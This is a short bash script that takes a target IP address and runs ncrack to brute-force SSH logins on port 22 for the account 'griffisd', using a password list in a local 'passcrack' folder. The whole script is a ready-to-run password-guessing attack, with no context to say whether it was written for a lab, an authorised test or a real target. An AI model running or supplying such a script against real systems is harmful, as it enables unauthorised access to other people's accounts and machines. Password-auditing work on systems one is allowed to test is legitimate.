#!/bin/bash

if [ ! -n "$1" ]
then
  echo "Usage: `basename $0` target_ip_addr"
  exit 1
fi

ncrack --user griffisd -P passcrack/passlist $1 -p22
